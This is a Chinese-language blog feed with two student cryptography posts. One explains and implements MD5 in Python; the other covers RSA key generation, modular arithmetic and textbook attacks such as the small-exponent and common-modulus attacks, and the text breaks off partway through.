<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>花花的blog</title>
  
  <subtitle>厚积薄发</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://1187100546.github.io/"/>
  <updated>2020-01-12T14:45:28.303Z</updated>
  <id>https://1187100546.github.io/</id>
  
  <author>
    <name>huahua</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MD5加密</title>
    <link href="https://1187100546.github.io/2020/01/12/md5/"/>
    <id>https://1187100546.github.io/2020/01/12/md5/</id>
    <published>2020-01-12T13:15:24.000Z</published>
    <updated>2020-01-12T14:45:28.303Z</updated>
    
    <content type="html"><![CDATA[<p>密码学里的MD5加密。</p><a id="more"></a><h2 id="MD5算法原理"><a href="#MD5算法原理" class="headerlink" title="MD5算法原理"></a>MD5算法原理</h2><h3 id="消息填充"><a href="#消息填充" class="headerlink" title="消息填充"></a>消息填充</h3><ul><li><p>使消息长度模512=448如果消息长度模512恰等于448，增加512个填充比特。即填充的个数为1~512，填充方法：第1比特为1，其余全部为0</p></li><li><p>将消息长度转换为64比特的数值，如果长度超过64比特所能表示的数据长度，值保留最后64比特添加到填充数据后面，使数据为512比特的整数倍</p></li><li><p>512比特按32比特分为16组</p></li></ul><p><strong>注：64位数据长度存储的时候是小端序</strong></p><h3 id="初始化链接变量"><a href="#初始化链接变量" class="headerlink" title="初始化链接变量"></a>初始化链接变量</h3><p>使用4个32位的寄存器A， B，C， D存放4个固定的32位整型参数，用于第一轮迭代，这里需要注意的是，寄存器的值要转化为小端序。<br>$$ A=0x01234567\\B=0x89abcdef\\C=0xfedcba98\\D=0x76543210$$ </p><h3 id="分组处理"><a href="#分组处理" class="headerlink" title="分组处理"></a>分组处理</h3><p>与分组密码分组处理相似，有4轮步骤，将512比特的消息分组平均分为16个子分组，每个子分组有32比特，参与每一轮的的16步运算，每步输入是4个32比特的链接变量和一个32位的的消息子分组，经过这样的64步之后得到4个寄存器的值分别与输入的链接变量进行模加。</p><h3 id="步函数"><a href="#步函数" class="headerlink" title="步函数"></a>步函数</h3><p><img src="https://s2.ax1x.com/2020/01/12/lTYEY4.png" alt="lTYEY4.png"></p><p>该函数包括 4 轮，每轮 16 步，上一步的链接变量 D, B, C 直接赋值给下一步的链接变量 A, C, D。</p><p>A 先和非线性函数的结果加一下，结果再和 M[j] 加一下，结果再和 T[i] 加一下，结果再循环左移 s 次，结果再和原来的 B 加一下，最后的得到新 B。</p><p>非线性函数：</p><p><img src="https://s2.ax1x.com/2020/01/12/lTtd29.png" alt="lTtd29.png"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="消息填充-1"><a href="#消息填充-1" class="headerlink" title="消息填充"></a>消息填充</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">length = struct.pack(<span class="string">'&lt;Q'</span>, len(message)*<span class="number">8</span>)  <span class="comment">#原消息长度64位比特的添加格式</span></span><br><span class="line">    <span class="keyword">while</span> len(message) &gt; <span class="number">64</span>:</span><br><span class="line">        solve(message[:<span class="number">64</span>])</span><br><span class="line">        message = message[<span class="number">64</span>:]</span><br><span class="line">    <span class="comment">#长度不足64位消息自行填充</span></span><br><span class="line">    message += <span class="string">b'\x80'</span></span><br><span class="line">    message += <span class="string">b'\x00'</span> * (<span class="number">56</span> - len(message) % <span class="number">64</span>)</span><br><span class="line">    message += length</span><br><span class="line">solve(message[:<span class="number">64</span>])</span><br></pre></td></tr></table></figure><h3 id="初始化链接变量-1"><a href="#初始化链接变量-1" class="headerlink" title="初始化链接变量"></a>初始化链接变量</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A, B, C, D = (<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>)</span><br></pre></td></tr></table></figure><h3 id="分组处理及步函数"><a href="#分组处理及步函数" class="headerlink" title="分组处理及步函数"></a>分组处理及步函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(chunk)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    <span class="keyword">global</span> B</span><br><span class="line">    <span class="keyword">global</span> C</span><br><span class="line">    <span class="keyword">global</span> D</span><br><span class="line">    w = list(struct.unpack(<span class="string">'&lt;'</span> + <span class="string">'I'</span> * <span class="number">16</span>, chunk))  <span class="comment">#分成16个组，I代表1组32位</span></span><br><span class="line">    a, b, c, d = A, B, C, D</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):  <span class="comment">#64轮运算</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">16</span>:  <span class="comment">#每一轮运算只用到了b,c,d三个</span></span><br><span class="line">            f = ( b &amp; c)|((~b) &amp; d)</span><br><span class="line">            flag  = i      <span class="comment">#用于标识处于第几组信息</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">32</span>:</span><br><span class="line">            f = (b &amp; d)|(c &amp; (~d))</span><br><span class="line">            flag = (<span class="number">5</span> * i +<span class="number">1</span>) %<span class="number">16</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">48</span>:</span><br><span class="line">            f = (b ^ c ^ d)</span><br><span class="line">            flag  = (<span class="number">3</span> * i + <span class="number">5</span>)% <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = c ^(b |(~d))</span><br><span class="line">            flag  = (<span class="number">7</span> * i ) % <span class="number">16</span></span><br><span class="line">        tmp = b + lrot((a + f + k[i] + w[flag])&amp; <span class="number">0xffffffff</span>,r[i]) <span class="comment">#&amp;0xffffffff为了类型转换</span></span><br><span class="line">        a, b, c, d = d, tmp &amp; <span class="number">0xffffffff</span>, b, c</span><br><span class="line">    A = (A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    B = (B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    C = (C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">D = (D + d) &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="https://s2.ax1x.com/2020/01/12/lTtW2d.png" alt="lTtW2d.png"></p><p>找一个在线加密的网站验证一下</p><p><img src="https://s2.ax1x.com/2020/01/12/lTtfxA.png" alt="lTtfxA.png"></p><h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>攻击者的主要目标不是恢复原始的明文，而是用非法消息替代合法消息进行伪造和欺骗，对哈希函数的攻击也是寻找碰撞的过程。</p><p>基本攻击方法：</p><p>（1）穷举攻击：能对任何类型的Hash函数进行攻击</p><p>最典型方法是“生日攻击”：给定初值𝐻0=H(M)，寻找𝑀’≠ 𝑀，使ℎ(𝑀’)= 𝐻0</p><p>（2）密码分析法：依赖于对Hash函数的结构和代数性质分析，采用针对Hash函数弱性质的方法进行攻击。这类攻击方法有中间相遇攻击、修正分组攻击和差分分析等</p><p>MD5算法中，输出的每一位都是输入的每一位的函数，逻辑函数F、G、H、I的复杂迭代使得输出对输入的依赖非常小</p><p>但Berson证明，对单轮的MD5算法，利用差分分析，可以在合理时间内找出碰撞的两条消息</p><p>MD5算法抗密码分析的能力较弱，生日攻击所需代价是试验264个消息</p><p>2004年8月17日，在美国加州圣巴巴拉召开的美密会（Crypto2004）上，中国的王小云、冯登国、来学嘉、于红波4位学者宣布，只需1小时就可找出MD5的碰撞（利用差分分析）</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">lrot = <span class="keyword">lambda</span> x,n: (x &lt;&lt; n)|(x &gt;&gt; <span class="number">32</span>- n)  <span class="comment">#循环左移的操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#初始向量</span></span><br><span class="line">A, B, C, D = (<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>)</span><br><span class="line"><span class="comment"># A, B, C, D = (0x01234567, 0x89ABCDEF, 0xFEDCBA98, 0x76543210)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#循环左移的位移位数</span></span><br><span class="line">r = [   <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">        <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">         <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用正弦函数产生的位随机数，也就是书本上的T[i]</span></span><br><span class="line">k =  [int(math.floor(abs(math.sin(i + <span class="number">1</span>)) * (<span class="number">2</span> ** <span class="number">32</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_mess</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    <span class="keyword">global</span> B</span><br><span class="line">    <span class="keyword">global</span> C</span><br><span class="line">    <span class="keyword">global</span> D</span><br><span class="line">    A, B, C, D = (<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>)</span><br><span class="line">    <span class="comment"># A, B, C, D = (0x01234567, 0x89ABCDEF, 0xFEDCBA98, 0x76543210)</span></span><br><span class="line">    length = struct.pack(<span class="string">'&lt;Q'</span>, len(message)*<span class="number">8</span>)  <span class="comment">#原消息长度64位比特的添加格式</span></span><br><span class="line">    <span class="keyword">while</span> len(message) &gt; <span class="number">64</span>:</span><br><span class="line">        solve(message[:<span class="number">64</span>])</span><br><span class="line">        message = message[<span class="number">64</span>:]</span><br><span class="line">    <span class="comment">#长度不足64位消息自行填充</span></span><br><span class="line">    message += <span class="string">b'\x80'</span></span><br><span class="line">    message += <span class="string">b'\x00'</span> * (<span class="number">56</span> - len(message) % <span class="number">64</span>)</span><br><span class="line">    message += length</span><br><span class="line">    solve(message[:<span class="number">64</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(chunk)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    <span class="keyword">global</span> B</span><br><span class="line">    <span class="keyword">global</span> C</span><br><span class="line">    <span class="keyword">global</span> D</span><br><span class="line">    w = list(struct.unpack(<span class="string">'&lt;'</span> + <span class="string">'I'</span> * <span class="number">16</span>, chunk))  <span class="comment">#分成16个组，I代表1组32位</span></span><br><span class="line">    a, b, c, d = A, B, C, D</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):  <span class="comment">#64轮运算</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">16</span>:  <span class="comment">#每一轮运算只用到了b,c,d三个</span></span><br><span class="line">            f = ( b &amp; c)|((~b) &amp; d)</span><br><span class="line">            flag  = i      <span class="comment">#用于标识处于第几组信息</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">32</span>:</span><br><span class="line">            f = (b &amp; d)|(c &amp; (~d))</span><br><span class="line">            flag = (<span class="number">5</span> * i +<span class="number">1</span>) %<span class="number">16</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">48</span>:</span><br><span class="line">            f = (b ^ c ^ d)</span><br><span class="line">            flag  = (<span class="number">3</span> * i + <span class="number">5</span>)% <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = c ^(b |(~d))</span><br><span class="line">            flag  = (<span class="number">7</span> * i ) % <span class="number">16</span></span><br><span class="line">        tmp = b + lrot((a + f + k[i] + w[flag])&amp; <span class="number">0xffffffff</span>,r[i]) <span class="comment">#&amp;0xffffffff为了类型转换</span></span><br><span class="line">        a, b, c, d = d, tmp &amp; <span class="number">0xffffffff</span>, b, c</span><br><span class="line">    A = (A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    B = (B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    C = (C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    D = (D + d) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">digest</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    <span class="keyword">global</span> B</span><br><span class="line">    <span class="keyword">global</span> C</span><br><span class="line">    <span class="keyword">global</span> D</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIII'</span>,A,B,C,D)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_digest</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(digest()).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mess = input(<span class="string">"请输入你的信息:"</span>)</span><br><span class="line">        init_mess(mess.encode())</span><br><span class="line">        out_put = hex_digest()</span><br><span class="line">        print(type(out_put))</span><br><span class="line">        <span class="keyword">print</span> (out_put)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;密码学里的MD5加密。&lt;/p&gt;
    
    </summary>
    
    
      <category term="密码学" scheme="https://1187100546.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="https://1187100546.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>公钥密码RSA</title>
    <link href="https://1187100546.github.io/2020/01/12/RSA/"/>
    <id>https://1187100546.github.io/2020/01/12/RSA/</id>
    <published>2020-01-12T10:16:06.000Z</published>
    <updated>2020-01-12T10:34:44.060Z</updated>
    
    <content type="html"><![CDATA[<p>密码学中的RSA加密。</p><a id="more"></a><h2 id="RSA算法原理"><a href="#RSA算法原理" class="headerlink" title="RSA算法原理"></a>RSA算法原理</h2><ol><li>密钥的生成</li></ol><ul><li><p>选择两个大素数 𝑝和𝑞,（𝑝≠𝑞，需要保密，步骤4以后建议销毁）</p></li><li><p>计算𝑛=𝑝×𝑞， (𝑛)=(𝑝－1)×(𝑞－1)</p></li><li><p>选择整数 𝑒 使 ((𝑛)，𝑒) =1,  1&lt;𝑒&lt; (𝑛) </p></li><li><p>计算𝑑，使𝑑=𝑒－1 𝑚𝑜𝑑 (𝑛),</p></li></ul><p>​    得到：公钥为{𝑒, 𝑛}； 私钥为{𝑑}</p><ol start="2"><li><p>加密(用𝒆，𝒏)： 明文𝑀&lt;𝑛， 密文𝐶=𝑀^𝑒 (𝑚𝑜𝑑 𝑛).</p></li><li><p>解密(用𝒅，𝒏)： 密文𝐶， 明文𝑀 =𝐶^𝑑 (𝑚𝑜𝑑 𝑛)</p></li></ol><h2 id="大素数生成"><a href="#大素数生成" class="headerlink" title="大素数生成"></a>大素数生成</h2><p>Miler-Rabin 算法：</p><p>对于大整数的素性测试，一般用 Miller-Rabin 算法。它是一个基于概率的算法，是费马小定理（若 n 是一个素数，则 an-1 ≡ 1 (mod n) ）的一个改进。要测试 n 是否为素数，首先将 n−1 分解为 2sd 。在每次测试开始时，先随机选一个介于 [1,n−1] 的整数 a ，之后如果对所有的 r∈[0,s−1] ，若admodn≠1 且 a2rd mod n≠−1，则 n 是合数。否则，n 有 3/4 的概率为素数。增加测试的次数，该数是素数的概率会越来越高。这样，我们就可以给定位数 n 的情况下随机生成数，然后再用 Miller-Rabin 算法验证它是不是素数，若是，则就用它，否则再随机生成其他数字，循环。Python 脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 素性检验：采用 Miler-Rabin 检验法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin</span><span class="params">(n,k=<span class="number">80</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">2</span> <span class="keyword">or</span> n == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    r, s = <span class="number">0</span>, n - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">        s //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(k):</span><br><span class="line">        a = random.randrange(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">        x = pow(a, s, n)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == n - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(r - <span class="number">1</span>):</span><br><span class="line">            x = pow(x, <span class="number">2</span>, n)</span><br><span class="line">            <span class="keyword">if</span> x == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="comment"># 生成 b 位的素数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genPrime</span><span class="params">(b=<span class="number">1024</span>)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># the highest bit is 1</span></span><br><span class="line">        ans = <span class="string">"1"</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(b<span class="number">-2</span>):</span><br><span class="line">            ans += str(random.randint(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">        <span class="comment"># the lowest bit is 1</span></span><br><span class="line">        ans += <span class="string">"1"</span></span><br><span class="line">        ans = int(ans,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> miller_rabin(ans):</span><br><span class="line">            <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h2 id="带模的幂运算"><a href="#带模的幂运算" class="headerlink" title="带模的幂运算"></a>带模的幂运算</h2><p>原理：模重复平方运算，Python 代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FastMod</span><span class="params">(x, n, m)</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = x</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        temp = n</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span> :</span><br><span class="line">            a = a * b % m</span><br><span class="line">        b = b * b % m</span><br><span class="line">        n = n//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> temp &lt; <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><h2 id="求逆运算"><a href="#求逆运算" class="headerlink" title="求逆运算"></a>求逆运算</h2><p>扩展欧几里得法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">computeD</span><span class="params">(e, phi_n)</span>:</span></span><br><span class="line">    (x, y, r) = extendedGCD(phi_n, e)</span><br><span class="line">    <span class="comment"># y maybe &lt; 0, so convert it</span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> phi_n + y</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"><span class="comment"># Extended Euclidean algorithm</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extendedGCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="comment"># a*xi + b*yi = ri</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    <span class="comment"># a*x1 + b*y1 = a</span></span><br><span class="line">    x1 = <span class="number">1</span></span><br><span class="line">    y1 = <span class="number">0</span></span><br><span class="line">    <span class="comment"># a*x2 + b*y2 = b</span></span><br><span class="line">    x2 = <span class="number">0</span></span><br><span class="line">    y2 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        q = a // b</span><br><span class="line">        <span class="comment"># ri = r(i-2) % r(i-1)</span></span><br><span class="line">        r = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = r</span><br><span class="line">        <span class="comment"># xi = x(i-2) - q*x(i-1)</span></span><br><span class="line">        x = x1 - q*x2</span><br><span class="line">        x1 = x2</span><br><span class="line">        x2 = x</span><br><span class="line">        <span class="comment"># yi = y(i-2) - q*y(i-1)</span></span><br><span class="line">        y = y1 - q*y2</span><br><span class="line">        y1 = y2</span><br><span class="line">        y2 = y</span><br><span class="line"><span class="keyword">return</span>(x1, y1, a)</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="https://s2.ax1x.com/2020/01/12/lov9Nn.png" alt="lov9Nn.png"></p><h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>RSA的安全性依赖于大数分解问题，目前，还未能从数学上证明由𝑐和𝑒计算出𝑚一定需要分解𝑛，然而，如果新方法能使密码分析者推算出𝑑，它也就成为大数分解的一个新方法</p><p>非对称加密算法中 1024 bit 密钥的强度相当于对称加密算法 80bit 密钥的强度。但是，从效率上，密钥长度增长一倍，公钥操作所需时间增加约 4 倍，私钥操作所需时间增加约 8 倍，公私钥生成时间约增长16倍。所以，我们要权衡一下效率和安全性。一般来说， 1024 bit 只能用于加密 最多117 字节的明文。</p><p>低加密指数攻击：</p><p>为了使加密高效，一般希望选取较小的加密指数 e ，但是 e 不能太小，否则容易遭到低加密指数攻击。</p><p>假设用户使用的密钥 e=3 。考虑到加密关系满足：<br>$$<br>C\equiv m^3\ mod\ n\<br>$$<br>则容易得到：<br>$$<br>m^3=c+k\times n\<br>m=\sqrt[3]{c+k\times n}<br>$$<br>攻击者可以从小到大枚举 k ，依次开三次根，直到开出整数为止。</p><p>低加密指数广播攻击：</p><p>还有一种情况是如果给 k 个用户发的都是同个低加密指数比如 e=3 ，在不同的模数 n1.n2,n3下 ，可由 CRT（中国剩余定理） 解出 m3 ，从而直接开三次根解出 m。</p><p>共模攻击：</p><p>场景：n 相同（让多个用户使用相同的模数 n ），但他们的公私钥对不同。这样，我们可以在已知 n,e1,e2,c1,c2 的情况下解出 m 。过程如下：</p><p>其实有个隐形的前提条件是：<br>$$<br>gcd(e_1,e_2)=1<br>$$<br>存在 s1,s2 使得：<br>$$<br>s_1e_1+s_2e_2=1<br>$$<br>又由 RSA 定义可知：<br>$$<br>c_1\equiv m^{e_1}\ mod\ n\<br>c_2\equiv m^{e_2}\ mod \ n<br>$$<br>可得出：<br>$$<br>c_1^{s_1}c_2^{s_2}\equiv m\ mod\ n<br>$$<br>解出明文。</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" 